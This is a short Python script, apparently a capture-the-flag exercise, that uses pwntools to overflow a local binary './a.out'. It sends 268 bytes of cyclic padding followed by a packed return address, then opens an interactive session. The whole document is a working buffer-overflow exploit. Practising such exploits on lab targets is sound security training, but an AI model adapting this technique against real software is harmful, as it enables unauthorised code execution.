from pwn import *

payload_length = 268
payload = cyclic(payload_length) + p64(0x69420)

binary_path = './a.out'
p = process(binary_path)


p.recv()

p.sendline(payload)
p.interactive()